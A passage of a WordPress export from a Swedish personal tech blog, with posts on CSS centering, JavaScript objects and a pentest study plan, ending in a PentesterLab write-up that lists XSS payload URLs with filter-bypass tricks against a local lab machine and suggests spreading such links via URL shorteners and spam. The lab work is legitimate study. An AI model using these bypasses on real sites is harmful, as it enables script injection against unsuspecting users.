Där kan du sedan välja bakgrund, om du vill ha en nedräknare å så vidare. Sidan syns dock inte när du är inloggad vilket innebär att du kan arbeta med sidan samtidigt.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1661</wp:post_id>
		<wp:post_date>2015-08-18 19:42:35</wp:post_date>
		<wp:post_date_gmt>2015-08-18 19:42:35</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>under-konstruktion-sida-i-wordpress</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="wordpress"><![CDATA[wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[13859348746]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[437]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[437]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Tekniker för att Centrera saker</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/09/08/how-to-vertically-center-stuff/</link>
		<pubDate>Tue, 08 Sep 2015 17:41:54 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=470</guid>
		<description></description>
		<content:encoded><![CDATA[Varje

https://scotch.io/tutorials/a-visual-guide-to-css3-flexbox-properties
https://css-tricks.com/almanac/properties/a/align-content/
https://philipwalton.github.io/solved-by-flexbox/demos/vertical-centering/

Centrera saker i flexbox. Du sätter display å justify å sådant. Som jag skrivit nedan i en flexboxcontainer. Då kommer Sakerna som finns i den diven att centreras.

[code lang="css"]
.flexboxcontainer{
width: 400px;
height: 400px;
display: flex;
flex-direction: row; /*Du kan välja mellan row och column */
justify-content: center;
align-items: center;
}

.box-inside-flexboxcontainer {
}
[/code]

<h1>Horizontell centrering</h1>

<h2>Text-align</h2>
Text-align-tekniken är klassisk. Först skapar du en div-container. Denna container behöver ha en specificerad width för att det ska funka. Annars kommer den bara vara så står som innehållet i diven, å då går det ju inte att centrera.

Sedan behöver vi en div som ska centreras. Vi ger den en längd å bredd. Det viktigaste här är att komma ihåg att en div inte är en text, å en div är ett block-element, inte ett inline-element. Därför måste vi förvandla diven till ett inline-blocks-element. Det gör vi med display: inline-block. Då får diven inline-liknande egenskaper samtidigt som den är typ som ett block. 
[code lang="css"]
.container {
width: 500px;
text-align: center;
}

.box {
width: 100px;
height: 100px;
display: inline-block;
}
[/code]

<h2>Margin-auto-tekniken</h2>
Det går helt enkelt ut på att du sätter marginalen på auto i innerdiven. Då justerar den sig automatiskt och blir därmed centrerad.
[code lang="css"]
.container {
width: 500px;
}

.box {
width: 100px;
height: 100px;
margin-left: auto;
margin-right: auto;
}
[/code]

<h2>Position-absolute-tekniken </h2>
Den här tekniken fungerar genom att sätta position absolute, å sedan sätta den på 50%. Detta innebär alltså att positionen är i mitten. Men eftersom diven i det här exemplet är 100px stor så innebär det att det är den vänstra sidan som är precis 50% in i container-diven. För att den ska bli helt centrerad måste vi därför justera marginalen med -50px (alltså hälften av diven storlek). Då blir den helt centrerad.

[code lang="css"]
.container {
width: 500px;
}

.box {
width: 100px;
height: 100px;
position: absolute;
left: 50%;
margin-left: -50px;
}
[/code]


<h1>Vertical centering</h1>

<h2>Position-absolute-tekniken</h2>
Denna teknik är besläktad med tekniken ovan med samma namn. Men det finns några viktiga skillnader. För att innerdiven inte ska flyga iväg åt tjotahejti så måste vi göra .container till position: relative. Annars så flyger innerdiven upp å lägger sig med en margin på -50px från body. Å det vill vi inte.

[code lang="css"]
.container {
width: 500px;
position: relative;
}

.box {
width: 100px;
height: 100px;
position: absolute;
left: 50%;
margin-left: -50px;
top: 50%;
margin-top: -50px;
}
[/code]
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>470</wp:post_id>
		<wp:post_date>2015-09-08 17:41:54</wp:post_date>
		<wp:post_date_gmt>2015-09-08 17:41:54</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>how-to-vertically-center-stuff</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="css"><![CDATA[css]]></category>
		<category domain="category" nicename="flex"><![CDATA[flex]]></category>
		<category domain="category" nicename="html"><![CDATA[html]]></category>
		<category domain="category" nicename="web-utveckling"><![CDATA[web-utveckling]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[14570267597]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[470]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[470]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_fd8c396ce5567825860af2334d89364f</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_cd464bb539ee0a42624076f6f9f09eca</wp:meta_key>
			<wp:meta_value><![CDATA[<div class="embed-css-tricks"><blockquote class="wp-embedded-content"><a href="https://css-tricks.com/almanac/properties/a/align-content/">align-content</a></blockquote><script type='text/javascript'><!--//--><![CDATA[//><!--		!function(a,b){"use strict";function c(){if(!e){e=!0;var a,c,d,f,g=-1!==navigator.appVersion.indexOf("MSIE 10"),h=!!navigator.userAgent.match(/Trident.*rv:11./),i=b.querySelectorAll("iframe.wp-embedded-content");for(c=0;c<i.length;c++)if(d=i[c],!d.getAttribute("data-secret")){if(f=Math.random().toString(36).substr(2,10),d.src+="#?secret="+f,d.setAttribute("data-secret",f),g||h)a=d.cloneNode(!0),a.removeAttribute("security"),d.parentNode.replaceChild(a,d)}else;}}var d=!1,e=!1;if(b.querySelector)if(a.addEventListener)d=!0;if(a.wp=a.wp||{},!a.wp.receiveEmbedMessage)if(a.wp.receiveEmbedMessage=function(c){var d=c.data;if(d.secret||d.message||d.value)if(!/[^a-zA-Z0-9]/.test(d.secret)){var e,f,g,h,i,j=b.querySelectorAll('iframe[data-secret="'+d.secret+'"]'),k=b.querySelectorAll('blockquote[data-secret="'+d.secret+'"]');for(e=0;e<k.length;e++)k[e].style.display="none";for(e=0;e<j.length;e++)if(f=j[e],c.source===f.contentWindow){if(f.removeAttribute("style"),"height"===d.message){if(g=parseInt(d.value,10),g>1e3)g=1e3;else if(200>~~g)g=200;f.height=g}if("link"===d.message)if(h=b.createElement("a"),i=b.createElement("a"),h.href=f.getAttribute("src"),i.href=d.value,i.host===h.host)if(b.activeElement===f)a.top.location.href=d.value}else;}},d)a.addEventListener("message",a.wp.receiveEmbedMessage,!1),b.addEventListener("DOMContentLoaded",c,!1),a.addEventListener("load",c,!1)}(window,document);//--><!]]]]><![CDATA[></script><iframe sandbox="allow-scripts" security="restricted" src="https://css-tricks.com/almanac/properties/a/align-content/embed/" width="500" height="282" title="&#8220;align-content&#8221; &#8212; CSS-Tricks" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" class="wp-embedded-content"></iframe></div>]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_time_cd464bb539ee0a42624076f6f9f09eca</wp:meta_key>
			<wp:meta_value><![CDATA[1468462315]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_8358c551af935013a754bd5b8cb60619</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_db302cb19acfee9e281154495bd9fbfa</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_239f3f4de146813bb7c482f5004b6207</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_e4aae7dc24b512844fb1338585f586da</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>JavaScript och Object Oriented Programming</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/09/15/javascript-och-object-oriented-programming/</link>
		<pubDate>Tue, 15 Sep 2015 16:38:33 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=478</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Vad är ett objekt?</h2>
Ett objekt i Javascript är som ett objekt i verkligheten. Ett objekt består av properties. Ett fysiskt objekt består också av properties. Till exempel: objektet kopp består av handtag : 1, design: true, vikt : 1 kg. Dessa properties beskriver objektet. Ett annat vanligt exempel är objektet bil. En bil har properties dörr : 4st, motor: 1, färg: grön. Å så vidare.
Ofta pratar man om property och property value.

[code lang="js"]
var myObject = {
name: &quot;Lars&quot;, //Name är property och Lars är Property Value
age: 28
}
[/code]

<h3>Hur skapar man ett objekt i Javascript?</h3>
Det finns i huvudsak två sätt att skapa ett objekt i javascript: <strong>object literal</strong> och <strong>object constructor</strong>.

Object literal ser ut såhär:

[code lang="js"]var myObject = {
name: &quot;Lars&quot;,
age: 28
}
[/code]

Constructor pattern ser ut såhär:

[code lang="js"]

var Employee = function(){ 
} 

//eller såhär

function Employee(name, profession){
this.name = name;
this.profession = profession;
}
[/code]

Employee är nu en Constructor-function som kan användas genom att använda keyword new. Så, för att skapa en ny emplyee. Gör du såhär:

[code lang="js"]
var philip = new Employee();
//philip är nu ett nytt objekt som vi skapade från Employee-funktionen.
[/code]

<h3>Hur lägger man till properties i ett objekt?</h3>
För att lägga till properties i ett objekt gör man såhär. Om man bygger vidare på exemplet som vi startat med ovan.

[code lang="js"]
philip.ålder = 23;
philip.namn = &quot;Philip&quot;;
[/code]

<h2>Methods</h2>
Det finns private properties och public properties.
Objekt har sina egna funktioner, dessa kallas methods.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>478</wp:post_id>
		<wp:post_date>2015-09-15 16:38:33</wp:post_date>
		<wp:post_date_gmt>2015-09-15 16:38:33</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>javascript-och-object-oriented-programming</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="javascript"><![CDATA[javascript]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[14813379198]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[478]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[478]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Appidé: Söka igenom böcker</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/09/15/appide-soka-igenom-bocker/</link>
		<pubDate>Tue, 15 Sep 2015 18:12:57 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=480</guid>
		<description></description>
		<content:encoded><![CDATA[Många gånger känner man för att söka igenom en bok som man läser. Men boken är i pappersformat så det går inte. Det är irriterande. Men då finns en app. Så man öppnar bara appen scannar av ISBN-koden och sedan söker man efter ett ord i boken.
Appen använder sig då av Google Books API och hittar var ordet finns. Anger sida och så.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>480</wp:post_id>
		<wp:post_date>2015-09-15 18:12:57</wp:post_date>
		<wp:post_date_gmt>2015-09-15 18:12:57</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>appide-soka-igenom-bocker</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="appide"><![CDATA[appidé]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[14816129262]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[480]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[480]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Fixa med impuestos interiores</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/12/02/fixa-med-impuestos-interiores/</link>
		<pubDate>Wed, 02 Dec 2015 14:05:03 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=622</guid>
		<description></description>
		<content:encoded><![CDATA[1. Öppna plugin som heter InstallSIIXmlSigned.app. Den finns i mappen Downloads.
2. Öppna Safari. Det får inte vara google chrome!! Bara safari!
3. logga in på impuestos internos.
4. Om dom frågar efter admin-password så kan du ge root.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>622</wp:post_id>
		<wp:post_date>2015-12-02 14:05:03</wp:post_date>
		<wp:post_date_gmt>2015-12-02 14:05:03</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>fixa-med-impuestos-interiores</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[17403977989]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[622]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[622]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Study-guide - Penttest</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/12/09/study-guide-penttest/</link>
		<pubDate>Wed, 09 Dec 2015 21:10:43 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=634</guid>
		<description></description>
		<content:encoded><![CDATA[Websäkerhet
1. Kör igenom denna. https://pentesterlab.com/exercises/web_for_pentester/course
-Skriv igenom en tydlig förklaring av allting för varje exempel

-A. XSS - <a href="https://narcotize.wordpress.com/2015/12/10/pentesterlab-web-for-pentester/">Check</a>
-B. SQL-injections
-C. Directory Traversal

2. Kör igenom Google XSS Game
- https://xss-game.appspot.com/
- Skriv ut i en bloggpost och beskriv tydligt.

3. Gå igenom dessa: http://overthewire.org/wargames/natas/
-A. Kategorisera challenges efter typ a sårbarhet.
-B. Skriv en tydlig beskrivning av hur du gick till väga och tankesätt och så.

4. OWASP Security Sheppard
- Gör som ovan. Gå igenom alla övningar och skriv ner och beskriv hur du gick till väga.

Kolla igenom vidosarna om websäk.
http://www.cs.fsu.edu/~redwood/OffensiveComputerSecurity/lectures.html]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>634</wp:post_id>
		<wp:post_date>2015-12-09 21:10:43</wp:post_date>
		<wp:post_date_gmt>2015-12-09 21:10:43</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>study-guide-penttest</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_format" nicename="post-format-aside"><![CDATA[Aside]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_oembed_992bb3c202f32ae1b4cddbc03111c601</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>geo_public</wp:meta_key>
			<wp:meta_value><![CDATA[0]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[25024976123]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[634]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[634]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_7c72479090b6790e6eaa5d406ac3e5c2</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1959580]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>PentesterLab - Web For Pentester</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/12/10/pentesterlab-web-for-pentester/</link>
		<pubDate>Thu, 10 Dec 2015 04:07:05 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=640</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>Installera</h1>
Så. Först måste du ladda ner VirtualBox. Därefter skapa en ny linuxmaskin, 32bit.
Därefter laddar du ner .iso-filen. Klickas på settings i din maskin, och sedan på storeage, där det är empy lägger du till iso-filen. Sen går du över till nätverk å byter från LAN till Bridged.
Sedan startar du den virtuella maskinen. När den har laddat klart kör du kommandot:
ifconfig
Då får du reda på datorns interna ip. Kopiera det å klistra in det i den browser, så kommer sidan upp.

<h2>XSS</h2>
Det finns i princip två sorters XSS. <strong>Persistent</strong> och <strong>non-persistent</strong>. Dessa kan även bveskrivas som Server och DOM attacker. Non-persistrent kallas ibland även för reflected.
Non-persistent: reflected.
Persitent: Server
I persistent så sparas scriptet, eller koden, i serverns databas. Så nästa gång som någon besöker sidan och servern skickar infon från databasen så innehåller den scriptet.
Persistent är självklart inte lika vanligt som non-persistent. Men det är mycket farligare attack.

Det finns även self-propagating.

Non-persistent/reflected.
Som man kan sedan nedan så kan XSS-attacker utföras direkt i adressfältet. Problemet är dock att attacken bara utsätter attackeraren själv som kör skriptet (när hen laddar sidan). Därför måste vi alltså lyckas transportera adressen med scriptet i till en annan användare. Detta kan göras genom url-förkortningar.
Google short blockerar om man försöker lägga in script. Men inte:
https://bitly.com/shorten/
Sedan krävs det vanlig hederlig social engineering. De vanligaste sätten är att skicka länkarna via spam eller via typ chatklienter. Typ skype. Ett annat sätt är att publicera länken på forum eller i kommentarsfält. Då kan man dessutom "gömma" adressen i en a href-tag.

Exempel 1.
Vi kan direkt se att i adressfältet kan man sätta in text som sedan skrivs ut på sidan. 
[code lang="html"]
http://192.168.1.101/xss/example1.php?name=hacker
[/code]
Här kan man alltså testa att sätta in ett script för att pröva om det exekivieras.
[code lang="html"]
http://192.168.1.101/xss/example1.php?name=&amp;lt;script&amp;gt;alert(&amp;quot;hej&amp;quot;)&amp;lt;/script&amp;gt;
[/code]

<strong>Exempel 2.</strong>
Här kan vi notera att om vi testar 
[code lang="html"]
http://192.168.1.101/xss/example1.php?name=&amp;lt;script&amp;gt;alert(&amp;quot;hej&amp;quot;)&amp;lt;/script&amp;gt;
[/code]

Så skrivs bara alert("hej") ut. Vilket tyder på att något filtrerar bort script-taggarna. Vilket gör att scriptet tolkas som text och inte som kod.

För att komma runt det så kan vi köra den enklaste formen.

[code lang="html"]
http://192.168.1.101/xss/example1.php?name=&amp;lt;Script&amp;gt;alert(&amp;quot;hej&amp;quot;)&amp;lt;/Script&amp;gt;
[/code]

Alltså, vi ändrade så att script stavas med stor bokstav. Den regex filtrering som hade implementeras hade inte tänkt så långt.

<strong>Exempel 3</strong>
Den här var lite knivigare. Hela 

[code lang="js"]
&amp;lt;script&amp;gt;
[/code]
Här nu bortfiltrerad. 
Knepet blir därför att köra
[code lang="js"]
http://192.168.1.101/xss/example3.php?name=&amp;lt;scri&amp;lt;script&amp;gt;pt&amp;gt;alert(&amp;quot;xss&amp;quot;)&amp;lt;/scri&amp;lt;/script&amp;gt;pt&amp;gt;
[/code]

<strong>Exempel 4</strong>
Här har script helt å hållet filtrerats bort. Då får vi istället injecta javascript i andra taggar.
andra taggar där man kan göra det är
a
img
[code lang="js"]
http://192.168.1.101/xss/example4.php?name=hacker&amp;lt;img src=&amp;quot;jj&amp;quot; onerror=&amp;quot;alert('hello')&amp;quot;/&amp;gt;

http://192.168.1.101/xss/example4.php?name=hacker%3Ca%20onclick=%22alert(%27hej%27)%22%20href=%22test%22/%3Ehejejej%3C/a%3E

http://192.168.1.101/xss/example4.php?name=hacker&amp;lt;a href=&amp;quot;alert(&amp;quot;hej&amp;quot;);&amp;quot;&amp;gt;klicka mig&amp;lt;/a&amp;gt;

http://192.168.1.101/xss/example4.php?name=hacker&lt;button%20onclick=%27alert(&quot;hello&quot;)%27&gt;button&lt;/button&gt;

http://192.168.1.101/xss/example4.php?name=hacker%3Cimg%20src=%22ff%22%20onclick=%27alert(%22hej%22)%27%3E

http://192.168.1.101/xss/example4.php?name=hacker%3Cp%20onmouseup=%27alert(%22hello%22)%27%3EClick%20the%20text!%3C/p%3E

http://192.168.1.101/xss/example4.php?name=hacker%3Cp%20onmousedown=%27alert(%22hello%22)%27%3EClick%20the%20text!%3C/p%3E
[/code]

Här funkar alltså alla javascript functioner men till element som inte innehåller ordet script.

<strong>Exempel 5</strong>
I Exempel 5 verkar det som att de tillåter script-taggen igen men nu är det alert som är sanitized. Det är enkelt att komma undan. Om vi vill få upp en pop-up så kan vi antingen köra:
[code lang="js"]
http://192.168.1.101/xss/example5.php?name=hacker&lt;script&gt;prompt(&quot;hello&quot;)&lt;/script&gt;

//eller
http://192.168.1.101/xss/example5.php?name=hacker&lt;script&gt;confirm(&quot;hello&quot;)&lt;/script&gt;

//Eller så skriver vi scriptet i unicode-tecken.

http://192.168.1.101/xss/example5.php?name=hacker%3Cscript%3Eeval(%22u0061u006Cu0065u0072u0074u0028u0027u0068u0065u006Cu006Cu006Fu0027u0029%22);%3C/script%3E
[/code]

Scriptet kan alltså skrivas i unicode-format. Eval utför koden oavsett om det är unicode/utf8/hexadecimal.
Om du enkelt vill förvanla utf8-text till unicode kan du använda den här koden:
[code lang="js"]
function toUnicode(theString) {
  var unicodeString = '';
  for (var i=0; i &lt; theString.length; i++) {
    var theUnicode = theString.charCodeAt(i).toString(16).toUpperCase();
    while (theUnicode.length &lt; 4) {
      theUnicode = '0' + theUnicode;
    }
    theUnicode = '\u' + theUnicode;
    unicodeString += theUnicode;
  }
  return unicodeString;
}
var uni = toUnicode(script);
console.log(uni);
[/code]

<strong>Exempel 6.</strong>
Här har det skett lite. Om vi kollar i källkoden så ser vi att det vi skickar in blir tolkat som att det är en del av en string som sätts in i en variabel.
För att lösa det behöver vi först avsluta stringen å sedan lägga in vår kod, å sedan kommentera ut efterföljande kod.
[code lang="js"]
http://192.168.1.101/xss/example6.php?name=hacker&quot;;alert(&quot;hello&quot;);//
[/code]

<strong>Exempel 7.</strong>
Här kan vi notera i källkoden att det är ungefär samma problem som Exempel 6. Skillnaden är bara att nu filteras alla "". Så vi använder bara '' istället

[code lang="js"]
http://192.168.1.101/xss/example7.php?name=';alert('hello');//
[/code]

<strong>Exempel 8.</strong>
Om vi klickar runt lite så kan vi se att vi kan injecta saker in i form-taggen. Där kan vi sen injecta vår alert via en onclick.
[code lang="js"]
http://192.168.1.101/xss/example8.php/%22onclick=%22alert('hello');
[/code]

<strong>Exempel 9.</strong>
Den sista var ganska så enkel. koden i källkoden såg ut såhär:

[code lang="js"]
&lt;script&gt;
  document.write(location.hash.substring(1));
&lt;/script&gt;
[/code]

Vilket betyder att den skriver ut på hemsidan (document.write) vad som finns i adressen efter hash-markören. Alltså efter #

Detta är ett exempel på en DOM-based attack. Hemsidan kan vara statisk men det finns ändå risk genom att man skriver document.write(location.hash)]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>640</wp:post_id>
		<wp:post_date>2015-12-10 04:07:05</wp:post_date>
		<wp:post_date_gmt>2015-12-10 04:07:05</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>pentesterlab-web-for-pentester</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
